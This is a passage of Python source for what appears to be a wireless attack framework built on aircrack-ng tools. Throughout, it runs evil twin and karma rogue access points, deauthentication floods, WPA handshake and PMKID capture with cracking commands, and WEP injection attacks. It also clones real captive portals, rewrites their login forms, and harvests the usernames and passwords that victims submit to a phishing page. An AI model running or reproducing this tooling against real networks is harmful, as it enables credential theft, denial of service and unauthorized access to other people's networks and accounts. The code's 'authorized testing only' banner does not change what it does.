        if not airbase:
            return

        print(f"\nEVIL TWIN → Cloning {target['essid']}")
        print(f"TX iface : {iface}"
              + (" [dedicated attack interface]" if self.iface_mgr.dual_interface else ""))
        cmd = [
            'sudo', airbase,
            '-e', target['essid'],
            '-c', target['channel'].strip(),
            '-a', target['bssid'],
            iface,
        ]
        print("Press Ctrl+C to stop\n")
        try:
            proc = subprocess.Popen(cmd)
            self.registry.register('evil_twin', proc)
            proc.wait()
        except KeyboardInterrupt:
            print("\nStopped.")
        finally:
            self.registry.terminate('evil_twin')

    def _attack_karma(self, target: dict, params: dict):
        iface   = self.iface_mgr.attack_interface
        airbase = self._require_tool('airbase-ng')
        if not airbase:
            return

        essid   = input("Fake AP ESSID (default: FreeWiFi): ").strip() or 'FreeWiFi'
        channel = input("Channel 1-13 (default 6): ").strip() or '6'
        print(f"\nKARMA ATTACK → ESSID: {essid}")
        print(f"TX iface : {iface}"
              + (" [dedicated attack interface]" if self.iface_mgr.dual_interface else ""))
        cmd = ['sudo', airbase, '-e', essid, '-c', channel, '-P', iface]
        print("Press Ctrl+C to stop\n")
        try:
            proc = subprocess.Popen(cmd)
            self.registry.register('karma', proc)
            proc.wait()
        except KeyboardInterrupt:
            print("\nStopped.")
        finally:
            self.registry.terminate('karma')

    def _attack_pmkid_capture(self, target: dict, params: dict):
        cap_iface = self.iface_mgr.capture_interface
        airodump  = self._require_tool('airodump-ng')
        if not airodump:
            return

        out = str(self.temp_dir / f"pmkid_{target['bssid'].replace(':', '')}")
        print(f"\nPMKID CAPTURE → {target['essid']}")
        print(f"RX iface : {cap_iface}")
        cmd = [
            'sudo', airodump,
            '-c', target['channel'].strip(),
            '--bssid', target['bssid'],
            '-w', out, cap_iface,
        ]
        print("Press Ctrl+C when capture is complete\n")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print(f"\nCapture saved to: {out}")

    def _attack_wpa_handshake(self, target: dict, params: dict):
        cap_iface = self.iface_mgr.capture_interface
        airodump  = self._require_tool('airodump-ng')
        if not airodump:
            return

        out = str(self.temp_dir / f"handshake_{target['bssid'].replace(':', '')}")
        print(f"\nWPA HANDSHAKE CAPTURE → {target['essid']}")
        print(f"RX iface : {cap_iface}")
        if self.iface_mgr.dual_interface:
            print(f"TX iface : {self.iface_mgr.attack_interface}"
                  "  [deauth on dedicated interface - capture uninterrupted]")
        print("1. Passive capture")
        print("2. Active (deauth + capture)")
        mode = input("Select (default 1): ").strip() or '1'

        self._set_target_channel(target)
        cmd = [
            'sudo', airodump,
            '-c', target['channel'].strip(),
            '--bssid', target['bssid'],
            '-w', out, cap_iface,
        ]

        if mode == '2':
            if self.iface_mgr.dual_interface:
                # Capture and deauth truly concurrent - no interruption
                print("\nStarting capture + deauth concurrently...")
                proc = subprocess.Popen(
                    cmd, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                self.registry.register('handshake_capture', proc)
                time.sleep(3)

                def deauth_loop():
                    for burst in range(3):
                        print(f" [*] Deauth burst {burst + 1}/3"
                              f" [{self.iface_mgr.attack_interface}]")
                        self._send_deauth(target, count='10')
                        time.sleep(3)

                dt = threading.Thread(target=deauth_loop, daemon=True)
                dt.start()
                print("Press Ctrl+C when handshake captured.\n")
                try:
                    proc.wait()
                except KeyboardInterrupt:
                    pass
                finally:
                    self.registry.terminate('handshake_capture')
                    dt.join(timeout=5)
            else:
                # Single interface: start capture, pause briefly to deauth
                print("\nStarting capture, deauth in 5s...")
                proc = subprocess.Popen(
                    cmd, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                self.registry.register('handshake_capture', proc)
                time.sleep(5)
                self._send_deauth(target, count='5')
                print("Deauth sent. Press Ctrl+C when handshake captured.\n")
                try:
                    proc.wait()
                except KeyboardInterrupt:
                    pass
                finally:
                    self.registry.terminate('handshake_capture')
        else:
            print("Press Ctrl+C when handshake captured.\n")
            try:
                subprocess.run(cmd)
            except KeyboardInterrupt:
                pass

        print(f"\nCapture : {out}-01.cap")
        print(f"Crack   : aircrack-ng -w /path/to/wordlist {out}-01.cap")

    def _send_deauth(self, target: dict, count: str = '5', client_mac: str | None = None):
        """
        Send deauth frames using the attack interface.
        Uses secondary interface when available so the capture interface
        is never interrupted mid-listen.
        """
        aireplay = self.tool_paths.get('aireplay-ng')
        if not aireplay:
            return
        iface = self.iface_mgr.attack_interface
        if not iface:
            return
        cmd = ['sudo', aireplay, '--deauth', count, '-a', target['bssid']]
        if client_mac:
            cmd += ['-c', client_mac]
        cmd.append(iface)
        try:
            subprocess.run(cmd, timeout=15,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Combo attacks
    # ------------------------------------------------------------------

    def _combo_deauth_handshake(self, target: dict, params: dict):
        """
        Concurrent: dedicated capture interface listens for the handshake
        while the attack interface sends deauth bursts.
        In single-interface mode falls back to sequential (capture then deauth).
        """
        cap_iface = self.iface_mgr.capture_interface
        atk_iface = self.iface_mgr.attack_interface
        airodump  = self._require_tool('airodump-ng')
        aireplay  = self._require_tool('aireplay-ng')
        if not airodump or not aireplay:
            return

        print(f"\n{'='*60}")
        print(f" COMBO: DEAUTH + HANDSHAKE CAPTURE")
        print(f" Target   : {target['essid']} ({target['bssid']})")
        print(f" Channel  : {target['channel'].strip()}")
        if self.iface_mgr.dual_interface:
            print(f" Capture  : {cap_iface}  [dedicated - uninterrupted]")
            print(f" Attack   : {atk_iface}  [dedicated - tx only]")
        else:
            print(f" Interface: {cap_iface}  [single - shared mode]")
        print(f"{'='*60}")

        self._set_target_channel(target)

        out = str(self.temp_dir / f"combo_hs_{target['bssid'].replace(':', '')}")
        cap_cmd = [
            'sudo', airodump,
            '-c', target['channel'].strip(),
            '--bssid', target['bssid'],
            '-w', out,
            cap_iface,
        ]

        cap_proc = subprocess.Popen(
            cap_cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        self.registry.register('combo_capture', cap_proc)
        time.sleep(3)
        print(" [*] Capture running...")

        if self.iface_mgr.dual_interface:
            # True concurrent mode: deauth thread runs while capture
            # continues uninterrupted on the separate interface
            def deauth_loop():
                for burst in range(3):
                    print(f" [*] Deauth burst {burst + 1}/3  [{atk_iface}]")
                    self._send_deauth(target, count='10')
                    time.sleep(3)
                print(" [*] Deauth complete - still capturing...")

            dt = threading.Thread(target=deauth_loop, daemon=True)
            dt.start()
            print(" [*] Press Ctrl+C when WPA handshake is captured\n")
            try:
                cap_proc.wait()
            except KeyboardInterrupt:
                pass
            finally:
                self.registry.terminate('combo_capture')
                dt.join(timeout=5)
        else:
            # Single interface: brief deauth burst then back to capture
            print(" [*] Sending deauth burst (single interface - brief interruption)...")
            time.sleep(2)
            self._send_deauth(target, count='10')
            print(" [*] Deauth sent - capture resuming...")
            print(" [*] Press Ctrl+C when WPA handshake is captured\n")
            try:
                cap_proc.wait()
            except KeyboardInterrupt:
                pass
            finally:
                self.registry.terminate('combo_capture')

        print(f"\n Capture : {out}-01.cap")
        print(f" Crack   : aircrack-ng -w wordlist {out}-01.cap")

    def _combo_evil_twin_portal(self, target: dict, params: dict):
        """
        Evil twin AP on the attack interface + continuous deauth on the
        capture interface to drive clients off the real AP.
        In single-interface mode runs the AP only (no simultaneous deauth).
        """
        print(f"\n{'='*60}")
        print(f" COMBO: EVIL TWIN + CAPTIVE PORTAL")
        print(f" Target: {target['essid']} ({target['bssid']})")
        if self.iface_mgr.dual_interface:
            print(f" AP     : {self.iface_mgr.attack_interface}  [rogue AP]")
            print(f" Deauth : {self.iface_mgr.capture_interface}  [continuous deauth]")
        else:
            print(" Mode   : single interface (no simultaneous deauth)")
        print(f"{'='*60}")

        portal_dir = self.temp_dir / f"portal_{target['essid'].replace(' ', '_')}"
        portal_dir.mkdir(parents=True, exist_ok=True)
        self._create_default_portal(portal_dir, target['essid'])

        if self.iface_mgr.dual_interface:
            # Start deauth loop in background thread on capture interface
            # while the portal runs on the attack interface
            stop_deauth = threading.Event()

            def deauth_loop():
                while not stop_deauth.is_set():
                    self._send_deauth(target, count='5')
                    stop_deauth.wait(timeout=5)

            dt = threading.Thread(target=deauth_loop, daemon=True)
            dt.start()
            print(" [*] Continuous deauth running on"
                  f" {self.iface_mgr.capture_interface}...")
            try:
                self._launch_rogue_ap_with_portal(
                    target, portal_dir, 'default_portal'
                )
            finally:
                stop_deauth.set()
                dt.join(timeout=5)
        else:
            self._launch_rogue_ap_with_portal(
                target, portal_dir, 'default_portal'
            )

    # ------------------------------------------------------------------
    # Captive portal attacks
    # ------------------------------------------------------------------

    def _attack_captive_portal_default(self, target: dict, params: dict):
        ssid = target['essid']
        portal_dir = self.temp_dir / f"portal_default_{ssid.replace(' ', '_')}"
        portal_dir.mkdir(parents=True, exist_ok=True)
        self._create_default_portal(portal_dir, ssid)
        self._launch_rogue_ap_with_portal(target, portal_dir, 'default_portal')

    def _attack_captive_portal_clone(self, target: dict, params: dict):
        ssid       = target['essid']
        portal_dir = self.temp_dir / f"portal_clone_{ssid.replace(' ', '_')}"
        portal_dir.mkdir(parents=True, exist_ok=True)

        # Find strongest AP for this SSID
        networks, _ = self.scan_engine.get_snapshot() if self.scan_engine else ([], {})
        matching = [n for n in networks if n['essid'] == ssid]
        if matching:
            connection_target = max(matching, key=lambda x: x.get('avg_power', -100))
        else:
            connection_target = target

        privacy = connection_target.get('privacy', '').upper()
        if privacy not in ('OPN', 'OPEN', ''):
            print(f"\nWarning: Network is {privacy} - captive portal clone works best on open networks.")
            if input("Continue? (y/n): ").strip().lower() != 'y':
                return

        print(f"\n[1/5] Connecting to {ssid} via {connection_target['bssid']}...")
        phys = self.iface_mgr.physical_interface
        if not phys or not self.iface_mgr.connect_to_network(phys, ssid):
            print("Failed to connect.")
            return

        print("[2/5] Detecting captive portal URL...")
        portal_url = self._detect_captive_portal() or f"http://192.168.1.1"
        print(f"Portal URL: {portal_url}")

        print("[3/5] Cloning portal with wget...")
        if not self._clone_portal_wget(portal_url, portal_dir):
            print("Clone failed.")
            self.iface_mgr.disconnect_from_network(phys)
            return

        print("[4/5] Modifying forms...")
        self._modify_portal_forms(portal_dir)

        print("[5/5] Disconnecting from target...")
        self.iface_mgr.disconnect_from_network(phys)

        input("\nPress Enter to launch rogue AP, Ctrl+C to cancel...")
        self._launch_rogue_ap_with_portal(target, portal_dir, 'cloned')

    def _detect_captive_portal(self) -> str | None:
        import urllib.request
        detection_urls = [
            'http://captive.apple.com',
            'http://connectivitycheck.gstatic.com/generate_204',
            'http://www.msftconnecttest.com/connecttest.txt',
        ]
        for url in detection_urls:
            try:
                resp = urllib.request.urlopen(url, timeout=5)
                if resp.geturl() != url:
                    return resp.geturl()
            except Exception:
                continue

        result = subprocess.run(
            ['ip', 'route', 'show', 'default'],
            capture_output=True, text=True
        )
        m = re.search(r'default via ([\d.]+)', result.stdout)
        if m:
            return f"http://{m.group(1)}"
        return None

    def _clone_portal_wget(self, url: str, portal_dir: Path) -> bool:
        clone_path = portal_dir / 'cloned'
        clone_path.mkdir(exist_ok=True)
        cmd = [
            'wget', '--recursive', '--level=3', '--page-requisites',
            '--adjust-extension', '--convert-links', '--no-parent',
            '--no-host-directories',
            '--directory-prefix', str(clone_path),
            '--timeout=20', '--tries=2', url
        ]
        try:
            subprocess.run(cmd, capture_output=True, timeout=60)
            return bool(list(clone_path.glob('**/*.html')))
        except Exception:
            return False

    def _modify_portal_forms(self, portal_dir: Path):
        clone_path = portal_dir / 'cloned'
        html_files = [
            f for f in clone_path.glob('**/*.html')
            if f.is_file()
        ]
        modified = 0
        for html_file in html_files:
            try:
                with open(html_file, 'r', encoding='utf-8', errors='ignore') as f:
                    soup = BeautifulSoup(f.read(), 'html.parser')
                for form in soup.find_all('form'):
                    inputs = form.find_all('input')
                    has_pw   = any(i.get('type') == 'password' for i in inputs)
                    has_text = any(i.get('type') in ('text', 'email', None) for i in inputs)
                    if has_pw and has_text:
                        form['action'] = '/capture_credentials'
                        form['method'] = 'post'
                        modified += 1
                with open(html_file, 'w', encoding='utf-8') as f:
                    f.write(str(soup))
            except Exception:
                continue
        print(f"Modified {modified} form(s) across {len(html_files)} HTML file(s).")

    def _create_default_portal(self, portal_dir: Path, ssid: str) -> Path:
        portal_html_dir = portal_dir / 'default_portal'
        portal_html_dir.mkdir(parents=True, exist_ok=True)

        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login - {ssid}</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg,#667eea 0%,#764ba2 100%);
            min-height:100vh; display:flex; align-items:center;
            justify-content:center; padding:20px;
        }}
        .container {{
            background:white; border-radius:12px;
            box-shadow:0 20px 60px rgba(0,0,0,.3);
            max-width:400px; width:100%; padding:40px;
        }}
        .wifi-icon {{
            width:80px; height:80px; margin:0 auto 20px;
            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
            border-radius:50%; display:flex; align-items:center;
            justify-content:center; font-size:40px; color:white;
        }}
        h1 {{ color:#333; font-size:24px; text-align:center; margin-bottom:10px; }}
        .network-name {{ text-align:center; color:#667eea; font-weight:600; font-size:18px; margin-bottom:30px; }}
        .welcome-text {{ text-align:center; color:#666; margin-bottom:30px; line-height:1.5; }}
        .form-group {{ margin-bottom:20px; }}
        label {{ display:block; color:#333; font-weight:500; margin-bottom:8px; font-size:14px; }}
        input {{
            width:100%; padding:12px 15px; border:2px solid #e0e0e0;
            border-radius:6px; font-size:15px; transition:border-color .3s;
        }}
        input:focus {{ outline:none; border-color:#667eea; }}
        button {{
            width:100%; padding:14px;
            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
            color:white; border:none; border-radius:6px;
            font-size:16px; font-weight:600; cursor:pointer;
        }}
        .terms {{ text-align:center; margin-top:20px; font-size:12px; color:#999; }}
        .terms a {{ color:#667eea; text-decoration:none; }}
    </style>
</head>
<body>
    <div class="container">
        <div style="text-align:center">
            <div class="wifi-icon">&#x1F4F6;</div>
            <h1>WiFi Access</h1>
            <div class="network-name">{ssid}</div>
        </div>
        <div class="welcome-text">Welcome! Please sign in to access the internet.</div>
        <form action="/capture_credentials" method="post">
            <div class="form-group">
                <label for="username">Email or Username</label>
                <input type="text" id="username" name="username" required placeholder="Enter your email">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required placeholder="Enter your password">
            </div>
            <button type="submit">Connect to WiFi</button>
        </form>
        <div class="terms">By connecting you agree to our <a href="#">Terms of Service</a></div>
    </div>
</body>
</html>'''

        (portal_html_dir / 'index.html').write_text(html, encoding='utf-8')
        print(f"Default portal created: {portal_html_dir}")
        return portal_html_dir

    def _launch_rogue_ap_with_portal(self, target: dict, portal_dir: Path, subdir: str):
        """Launch airbase-ng + dnsmasq + Python web server for captive portal."""
        mon      = self.iface_mgr.monitor_interface
        airbase  = self._require_tool('airbase-ng')
        dnsmasq  = self._require_tool('dnsmasq')
        if not airbase or not dnsmasq:
            return

        # Free port 80 and 53
        for svc in ('apache2', 'nginx', 'lighttpd', 'httpd'):
            subprocess.run(['sudo', 'systemctl', 'stop', svc], capture_output=True)
        subprocess.run(['sudo', 'systemctl', 'stop', 'systemd-resolved'], capture_output=True)
        subprocess.run(['sudo', 'pkill', 'dnsmasq'], capture_output=True)
        time.sleep(1)

        clone_path = portal_dir / subdir
        # Locate index file
        index_file = None
        for name in ('index.html', 'index.htm', 'login.html', 'portal.html'):
            candidates = list(clone_path.glob(f'**/{name}'))
            if candidates:
                index_file = candidates[0]
                break
        if not index_file:
            html_files = [f for f in clone_path.glob('**/*.html') if f.is_file()]
            index_file = html_files[0] if html_files else None
        if not index_file:
            print("No HTML files found. Cannot launch portal.")
            return

        web_root   = index_file.parent
        creds_file = self.temp_dir / f"creds_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        target_ssid = target['essid']

        class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=str(web_root), **kwargs)

            def do_POST(self):
                if self.path == '/capture_credentials':
                    length   = int(self.headers.get('Content-Length', 0))
                    raw      = self.rfile.read(length).decode('utf-8')
                    params   = parse_qs(raw)
                    username = ''
                    password = ''
                    for k, v in params.items():
                        kl = k.lower()
                        if any(x in kl for x in ('user', 'email', 'login', 'id')):
                            username = v[0] if v else ''
                        elif any(x in kl for x in ('pass', 'pwd')):
                            password = v[0] if v else ''

                    entry = (
                        f"\n{'='*70}\n"
                        f"Timestamp:  {datetime.now()}\n"
                        f"SSID:       {target_ssid}\n"
                        f"Client IP:  {self.client_address[0]}\n"
                        f"User-Agent: {self.headers.get('User-Agent','Unknown')}\n"
                        f"Username:   {username}\n"
                        f"Password:   {password}\n"
                        f"{'='*70}\n"
                    )
                    with open(creds_file, 'a') as fh:
                        fh.write(entry)
                    print(f"\n[CAPTURED] {username}:{password} from {self.client_address[0]}")

                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<html><body><h2>Authentication Failed</h2>'
                                     b'<p>Invalid credentials. Please try again.</p>'
                                     b'<a href="/">Back</a></body></html>')
                else:
                    self.send_error(404)

            def log_message(self, fmt, *args):
                pass  # suppress HTTP logs

        processes = []
        httpd     = None

        try:
            # Write dnsmasq config
            dnsmasq_conf = self.temp_dir / 'dnsmasq.conf'
            dnsmasq_conf.write_text(
                "interface=at0\n"
                "bind-interfaces\n"
                "dhcp-range=192.168.1.100,192.168.1.200,12h\n"
                "dhcp-option=3,192.168.1.1\n"
                "dhcp-option=6,192.168.1.1\n"
                "no-resolv\nno-poll\nport=0\n"
            )

            # Start airbase-ng
            print("Starting rogue AP...")
            ab_cmd = [
                'sudo', airbase,
                '-e', target_ssid,
                '-c', target.get('channel', '6').strip(),
                mon
            ]
            ab_proc = subprocess.Popen(ab_cmd, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.registry.register('rogue_ap', ab_proc)
            processes.append(('airbase-ng', ab_proc))
            time.sleep(3)

            # Configure at0
            subprocess.run(['sudo', 'ip', 'link', 'set', 'at0', 'up'], check=True)
            subprocess.run(['sudo', 'ip', 'addr', 'add', '192.168.1.1/24', 'dev', 'at0'], check=True)

            # Start dnsmasq
            print("Starting DHCP/DNS server...")
            dm_cmd = ['sudo', dnsmasq, '-C', str(dnsmasq_conf), '--no-daemon']
            dm_proc = subprocess.Popen(dm_cmd, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.registry.register('dnsmasq', dm_proc)
            processes.append(('dnsmasq', dm_proc))
            time.sleep(1)

            # iptables
            subprocess.run([
                'sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-i', 'at0', '-p', 'tcp', '--dport', '80',
                '-j', 'DNAT', '--to-destination', '192.168.1.1:80'
            ], capture_output=True)
            subprocess.run([
                'sudo', 'iptables', '-A', 'FORWARD', '-i', 'at0', '-j', 'ACCEPT'
            ], capture_output=True)
            subprocess.run([
                'sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'
            ], capture_output=True)

            # Start web server
            print("Starting captive portal web server on port 80...")
            httpd = socketserver.TCPServer(('192.168.1.1', 80), CaptivePortalHandler)

            print(f"\n{'='*70}")
            print("ROGUE AP ACTIVE")
            print(f"{'='*70}")
            print(f"SSID:        {target_ssid}")
            print(f"Portal:      http://192.168.1.1")
            print(f"Credentials: {creds_file}")
            print("Press Ctrl+C to stop")
            print(f"{'='*70}\n")

            httpd.serve_forever()

        except KeyboardInterrupt:
            print("\nStopping...")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            if httpd:
                try:
                    httpd.shutdown()
                    httpd.server_close()
                except Exception:
                    pass

            for name, proc in processes:
                self.registry.terminate(name)

            # iptables cleanup
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], capture_output=True)
            subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'], capture_output=True)

            # at0 cleanup
            for cmd in (
                ['sudo', 'ip', 'addr', 'flush', 'dev', 'at0'],
                ['sudo', 'ip', 'link', 'set', 'at0', 'down'],
                ['sudo', 'ip', 'link', 'delete', 'at0'],
            ):
                subprocess.run(cmd, capture_output=True)

            print("Portal cleanup complete.")

    # ------------------------------------------------------------------
    # WEP attacks
    # ------------------------------------------------------------------

    def _wep_preamble(self, target: dict, attack_name: str) -> str | None:
        aireplay = self._require_tool('aireplay-ng')
        if not aireplay:
            return None
        print(f"\n{attack_name}")
        print(f"Target: {target['essid']} ({target['bssid']})")
        self._set_target_channel(target)
        return aireplay

    def _attack_wep_fake_auth(self, target: dict, params: dict):
        aireplay = self._wep_preamble(target, "WEP FAKE AUTHENTICATION")
        if not aireplay:
            return
        mon = self.iface_mgr.monitor_interface
        cmd = ['sudo', aireplay, '-1', '0', '-a', target['bssid'], mon]
        print("Associating with AP for packet injection...\n")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nStopped.")

    def _attack_wep_arp_replay(self, target: dict, params: dict):
        aireplay = self._wep_preamble(target, "WEP ARP REPLAY ATTACK")
        if not aireplay:
            return
        mon = self.iface_mgr.monitor_interface
        cmd = ['sudo', aireplay, '-3', '-b', target['bssid'], mon]
        print("Capturing and replaying ARP packets to generate IVs...\n")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nStopped.")

    def _attack_wep_fragmentation(self, target: dict, params: dict):
        aireplay = self._wep_preamble(target, "WEP FRAGMENTATION ATTACK")
        if not aireplay:
            return
        mon = self.iface_mgr.monitor_interface
        cmd = ['sudo', aireplay, '-5', '-b', target['bssid'], mon]
        print("Obtaining keystream for packet injection...\n")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nStopped.")

    def _attack_wep_chopchop(self, target: dict, params: dict):
        aireplay = self._wep_preamble(target, "WEP CHOPCHOP ATTACK")
        if not aireplay:
            return
        mon = self.iface_mgr.monitor_interface
        cmd = ['sudo', aireplay, '-4', '-b', target['bssid'], mon]
        print("Decrypting WEP packets without key...\n")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nStopped.")

    def _attack_wep_crack(self, target: dict, params: dict):
        aircrack = self._require_tool('aircrack-ng')
        if not aircrack:
            return
        cap_file = input("Enter capture file (.cap): ").strip()
        if not Path(cap_file).exists():
            print(f"File not found: {cap_file}")
            return
        print(f"\nCRACK WEP KEY from {cap_file}")
        print("Requires 40,000-85,000 IVs.\n")
        try:
            subprocess.run(['sudo', aircrack, cap_file])
        except KeyboardInterrupt:
            print("\nStopped.")

    # ------------------------------------------------------------------
    # Cleanup
    # ------------------------------------------------------------------

    def _full_cleanup(self):
        print("\n" + "=" * 60)
        print("CLEANING UP")
        print("=" * 60)

        # Stop all registered processes
        self.registry.terminate_all()

        # Kill any lingering wireless attack binaries
        for binary in ('airbase-ng', 'airodump-ng', 'aireplay-ng', 'mdk3', 'dnsmasq'):
            self.registry.kill_by_name(binary)

        time.sleep(1)

        # Remove virtual interfaces
        for viface in ('at0', 'mon0'):
            subprocess.run(['sudo', 'ip', 'link', 'delete', viface], capture_output=True)

        # iptables cleanup
        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], capture_output=True)
        subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'], capture_output=True)

        # Restore interface
        self.iface_mgr.disable_monitor_mode()

        # Remove temp directory
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except Exception:
            pass

        # Restore DNS
        subprocess.run(['sudo', 'systemctl', 'start', 'systemd-resolved'], capture_output=True)
        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], capture_output=True)

        print("Cleanup complete.")

    # ------------------------------------------------------------------
    # Main loop
    # ------------------------------------------------------------------

    def run(self):
        print("=" * 60)
        print(" RED CELL SECURITY - WIRELESS ATTACK FRAMEWORK")
        print(" FOR AUTHORIZED SECURITY TESTING ONLY")
        print("=" * 60)

        try:
            if not self._setup_interfaces():
                return

            mon = self.iface_mgr.capture_interface

            while True:
                # Instantiate scan engine for this scan session
                self.scan_engine = ScanEngine(
                    monitor_interface=mon,
                    temp_dir=self.temp_dir,
                    supports_5ghz=self.iface_mgr.supports_5ghz,
                )

                print(f"\nStarting live scan on {mon}...")
                print("Use SPACE to select targets, ENTER to confirm, Q to quit.")
                time.sleep(1)

                # Run curses scan display
                self.selected_targets = self.scan_engine.run_display()

                if not self.selected_targets:
                    print("\nNo targets selected.")
                    retry = input("Scan again? (y/n): ").strip().lower()
                    if retry != 'y':
                        break
                    continue

                print(f"\nSelected {len(self.selected_targets)} target(s):")
                for t in self.selected_targets:
                    print(f"  - {t['essid']} ({t['bssid']}) CH:{t['channel']}")

                # Build and execute attack queue
                result = self._build_attack_queue()

                if result == 'rescan':
                    continue
                elif result == 'quit':
                    break

        except KeyboardInterrupt:
            print("\nInterrupted.")
        finally:
            self._full_cleanup()


# =============================================================================
# Entry point
# =============================================================================

def main():
    if os.geteuid() != 0:
        print("This tool requires root privileges.")
        print("Run with: sudo python3 wireless_attack_framework.py")
        sys.exit(1)

    framework = WirelessAttackFramework()
    framework.run()


if __name__ == "__main__":
    main()
